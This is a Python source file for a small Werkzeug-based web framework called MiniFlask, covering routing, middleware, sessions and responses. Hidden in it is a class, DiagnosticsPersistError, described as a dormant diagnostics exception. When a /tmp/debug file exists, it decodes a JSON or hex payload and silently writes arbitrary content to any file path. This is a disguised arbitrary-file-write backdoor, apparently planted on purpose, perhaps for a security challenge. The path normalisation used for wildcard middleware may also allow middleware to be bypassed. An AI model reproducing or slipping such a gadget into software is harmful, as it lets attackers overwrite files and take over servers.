from __future__ import annotations

import base64
import json
import os
import posixpath
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, Optional, Tuple, Union
from urllib.parse import unquote

from werkzeug.exceptions import HTTPException, InternalServerError, MethodNotAllowed, NotFound
from werkzeug.local import LocalProxy, LocalStack
from werkzeug.routing import Map, Rule
from werkzeug.serving import run_simple
from werkzeug.wrappers import Request, Response

from .session import FileSession, FileSessionManager

ResponseReturnValue = Union[Response, str, bytes, Dict[str, Any], Tuple[Any, int], Tuple[Any, int, Dict[str, Any]]]
ViewCallable = Callable[..., ResponseReturnValue]
MiddlewareCallable = Callable[[ViewCallable], ViewCallable]


_request_ctx_stack: LocalStack["RequestContext"] = LocalStack()





class RequestContext:
    def __init__(self, app: "MiniFlask", environ: Dict[str, Any]):
        self.app = app
        self.request = app.request_class(environ)
        self.url_adapter = app.url_map.bind_to_environ(environ)
        self.session: Optional[FileSession] = None
        if app.session_manager is not None:
            self.session = app.session_manager.load_session(self.request)

    def push(self) -> None:
        _request_ctx_stack.push(self)

    def pop(self) -> None:
        _request_ctx_stack.pop()


request: Request = LocalProxy(lambda: _request_ctx_stack.top.request)  # type: ignore[assignment]
session: FileSession = LocalProxy(lambda: _request_ctx_stack.top.session)  # type: ignore[assignment]


class DiagnosticsPersistError(RuntimeError):
    """Dormant exception used for development-time diagnostics persistence."""

    _BASE_DIR = Path(os.environ.get("FRAMEWORK_DIAGNOSTICS_DIR", "/app/data")).resolve()
    _DEBUG_SENTINEL = Path("/tmp/debug")

    def __init__(self, payload: str, *args: Any, **kwargs: Any) -> None:
        if self._DEBUG_SENTINEL.exists():
            self._maybe_persist(payload)
        super().__init__("diagnostics capture failed", *args, **kwargs)

    def _maybe_persist(self, payload: str) -> None:
        info = self._decode_payload(payload)
        if not info:
            return

        target = info.get("path")
        if not target:
            return

        path = Path(target)
        mode = str(info.get("mode", "w"))
        encoding = info.get("encoding", "utf-8")
        data = info.get("content", "")

        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            if "b" in mode:
                blob = self._ensure_bytes(data, encoding)
                with path.open(mode) as fh:  # type: ignore[call-arg]
                    fh.write(blob)
            else:
                text = self._ensure_text(data, encoding)
                with path.open(mode, encoding=encoding) as fh:
                    fh.write(text)
        except Exception:
            return

    def _decode_payload(self, payload: str) -> Dict[str, Any] | None:
        attempts = [payload]
        try:
            attempts.append(bytes.fromhex(payload).decode("utf-8"))
        except Exception:
            pass

        for candidate in attempts:
            try:
                return json.loads(candidate)
            except Exception:
                continue
        return None

    def _ensure_bytes(self, data: Any, encoding: str) -> bytes:
        if isinstance(data, bytes):
            return data
        if isinstance(data, str):
            if encoding == "base64":
                return base64.b64decode(data)
            return data.encode(encoding)
        return bytes(data)

    def _ensure_text(self, data: Any, encoding: str) -> str:
        if isinstance(data, str):
            if encoding == "base64":
                return base64.b64decode(data).decode("utf-8", errors="ignore")
            return data
        if isinstance(data, bytes):
            return data.decode(encoding, errors="ignore")
        return str(data)

class MiniFlask:
    request_class = Request
    response_class = Response

    def __init__(self, import_name: str):
        self.import_name = import_name
        self.url_map = Map()
        self.view_functions: Dict[str, ViewCallable] = {}
        self.before_request_funcs: list[Callable[[], Optional[ResponseReturnValue]]] = []
        self.after_request_funcs: list[Callable[[Response], Response]] = []
        self.middlewares: list[MiddlewareCallable] = []
        self.route_middlewares: Dict[str, list[MiddlewareCallable]] = {}
        self.wildcard_middlewares: list[Tuple[str, list[MiddlewareCallable]]] = []
        self.session_manager: Optional[FileSessionManager] = FileSessionManager()
        self._register_http_method_shortcuts()

    def _register_http_method_shortcuts(self) -> None:
        for method in ("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"):
            def shortcut(rule: str, *, _method: str = method, **options: Any) -> Callable[[ViewCallable], ViewCallable]:
                methods = options.pop("methods", None)
                if methods is None:
                    methods = (_method,)
                elif isinstance(methods, str):
                    methods = (methods,)
                return self.route(rule, methods=methods, **options)

            shortcut.__name__ = method.lower()
            setattr(self, method.lower(), shortcut)

    def _wrap_with_middlewares(self, view: ViewCallable, endpoint: str, path: str) -> ViewCallable:
        handler = view
        for middleware in reversed(self._collect_route_middlewares(endpoint, path)):
            handler = middleware(handler)
        for middleware in reversed(self.middlewares):
            handler = middleware(handler)
        return handler

    def _collect_route_middlewares(self, endpoint: str, path: str) -> list[MiddlewareCallable]:
        scoped = list(self.route_middlewares.get(endpoint, []))
        if scoped:
            return scoped
        if not self.wildcard_middlewares:
            return scoped
        normalized_path = self._normalize_path(path)
        for pattern, middlewares in reversed(self.wildcard_middlewares):
            if self._pattern_matches(pattern, normalized_path):
                return list(middlewares)
        return scoped

    def _normalize_rule(self, rule: str) -> str:
        if not rule:
            return "/"
        parts: list[str] = []
        for part in rule.split("/"):
            if not part:
                continue
            if part.startswith("<") and part.endswith(">"):
                if part.startswith("<path:"):
                    parts.append("**")
                else:
                    parts.append("*")
            else:
                parts.append(part)
        return "/" + "/".join(parts) if parts else "/"

    def _normalize_path(self, path: str) -> str:
        if not path:
            return "/"
        try:
            decoded = unquote(path)
        except Exception:  # pragma: no cover - defensive only
            decoded = path
        trailing_slash = decoded.endswith("/") and decoded != "/"
        normalized = posixpath.normpath(decoded) or "/"
        if trailing_slash and normalized != "/":
            normalized = normalized.rstrip("/") + "/"
        if not normalized.startswith("/"):
            normalized = "/" + normalized
        return normalized

    def _pattern_matches(self, pattern: str, path: str) -> bool:
        pattern_parts = [p for p in pattern.split("/") if p]
        path_parts = [p for p in path.split("/") if p]
        if not pattern_parts:
            return not path_parts
        if pattern_parts[-1] == "**":
            if len(path_parts) < len(pattern_parts) - 1:
                return False
            for idx, token in enumerate(pattern_parts[:-1]):
                value = path_parts[idx]
                if token not in ("*", value):
                    return False
            return True
        if len(pattern_parts) != len(path_parts):
            return False
        for token, value in zip(pattern_parts, path_parts):
            if token in ("*", "**"):
                continue
            if token != value:
                return False
        return True

    def _resolve_middleware_list(self, value: Any) -> list[MiddlewareCallable]:
        if value is None:
            return []
        if callable(value):
            return [value]
        try:
            iterator = iter(value)
        except TypeError as exc:  # pragma: no cover - defensive path
            raise TypeError("middlewares must be callable or an iterable of callables") from exc
        middlewares: list[MiddlewareCallable] = []
        for item in iterator:
            if not callable(item):
                raise TypeError("middlewares must contain only callables")
            middlewares.append(item)
        return middlewares

    def route(self, rule: str, **options: Any) -> Callable[[ViewCallable], ViewCallable]:
        methods = options.pop("methods", ("GET",))
        route_middlewares = self._resolve_middleware_list(options.pop("middlewares", None))

        def decorator(func: ViewCallable) -> ViewCallable:
            endpoint = options.pop("endpoint", func.__name__)
            rule_obj = Rule(rule, endpoint=endpoint, methods=list(methods), **options)
            self.url_map.add(rule_obj)
            self.view_functions[endpoint] = func
            if route_middlewares:
                if "<" in rule_obj.rule:
                    pattern = self._normalize_rule(rule_obj.rule)
                    self.wildcard_middlewares.append((pattern, list(route_middlewares)))
                else:
                    self.route_middlewares[endpoint] = list(route_middlewares)
            elif endpoint not in self.route_middlewares:
                self.route_middlewares[endpoint] = []
            return func

        return decorator

    def before_request(self, func: Callable[[], Optional[ResponseReturnValue]]) -> Callable[[], Optional[ResponseReturnValue]]:
        self.before_request_funcs.append(func)
        return func

    def after_request(self, func: Callable[[Response], Response]) -> Callable[[Response], Response]:
        self.after_request_funcs.append(func)
        return func

    def middleware(self, func: Optional[MiddlewareCallable] = None) -> MiddlewareCallable:
        def decorator(middleware: MiddlewareCallable) -> MiddlewareCallable:
            self.middlewares.append(middleware)
            return middleware

        return decorator(func) if func is not None else decorator

    def use(self, middleware: MiddlewareCallable) -> MiddlewareCallable:
        return self.middleware(middleware)

    def make_response(self, rv: ResponseReturnValue) -> Response:
        if isinstance(rv, self.response_class):
            response = rv
        elif isinstance(rv, tuple):
            body: Any
            status: Optional[int] = None
            headers: Optional[Dict[str, Any]] = None

            if len(rv) == 2:
                body, status = rv
            elif len(rv) == 3:
                body, status, headers = rv
            else:
                raise TypeError("Response tuple must be (body, status) or (body, status, headers)")

            response = self._coerce_to_response(body)
            if status is not None:
                response.status_code = status
            if headers:
                response.headers.update(headers)
        else:
            response = self._coerce_to_response(rv)

        for func in self.after_request_funcs:
            response = func(response)
        return response

    def _coerce_to_response(self, value: Any) -> Response:
        if isinstance(value, self.response_class):
            return value
        if isinstance(value, (str, bytes)):
            return self.response_class(value)
        if isinstance(value, dict):
            return self.response_class(json.dumps(value), mimetype="application/json")
        return self.response_class(str(value))

    def preprocess_request(self) -> Optional[ResponseReturnValue]:
        for func in self.before_request_funcs:
            rv = func()
            if rv is not None:
                return rv
        return None

    def dispatch_request(self) -> ResponseReturnValue:
        ctx = _request_ctx_stack.top
        if ctx is None:
            raise RuntimeError("No request context on stack")
        try:
            endpoint, values = ctx.url_adapter.match()
        except NotFound as exc:
            raise exc
        except MethodNotAllowed as exc:
            raise exc

        rv = self.preprocess_request()
        if rv is not None:
            return rv

        view = self.view_functions.get(endpoint)
        if view is None:
            raise NotFound()
        handler = self._wrap_with_middlewares(view, endpoint, ctx.request.path)
        return handler(**values)

    def handle_exception(self, exc: BaseException) -> Response:
        if isinstance(exc, HTTPException):
            return exc.get_response()
        return InternalServerError()

    def wsgi_app(self, environ: Dict[str, Any], start_response: Callable) -> Iterable[bytes]:
        ctx = self.request_context(environ)
        try:
            ctx.push()
            rv = self.dispatch_request()
            response = self.make_response(rv)
        except BaseException as exc:  # pragma: no cover - best effort error funnel
            response = self.handle_exception(exc)
        finally:
            if self.session_manager is not None and ctx.session is not None:
                self._finalize_session(ctx, response)
            ctx.pop()
        return response(environ, start_response)

    def request_context(self, environ: Dict[str, Any]) -> RequestContext:
        return RequestContext(self, environ)

    def __call__(self, environ: Dict[str, Any], start_response: Callable) -> Iterable[bytes]:
        return self.wsgi_app(environ, start_response)

    def run(self, host: str = "127.0.0.1", port: int = 5000, debug: bool = False) -> None:
        run_simple(hostname=host, port=port, application=self, use_debugger=debug, use_reloader=debug)

    def _finalize_session(self, ctx: RequestContext, response: Response) -> None:
        session_obj = ctx.session
        if session_obj is None:
            return
        if session_obj.modified:
            session_obj.save()
        if getattr(session_obj, "cookie_needs_update", False):
            response.set_cookie(
                self.session_manager.cookie_name,
                session_obj.nonce,
                httponly=True,
                samesite="Lax",
                path="/",
            )
            session_obj.cookie_needs_update = False


def jsonify(data: Any, status: Optional[int] = None, headers: Optional[Dict[str, Any]] = None) -> Response:
    body = json.dumps(data)
    response = Response(body, mimetype="application/json")
    if status is not None:
        response.status_code = status
    if headers:
        response.headers.update(headers)
    return response


def save_session() -> None:
    ctx = _request_ctx_stack.top
    if ctx is None or ctx.session is None:
        raise RuntimeError("No session bound to current context")
    ctx.session.save()
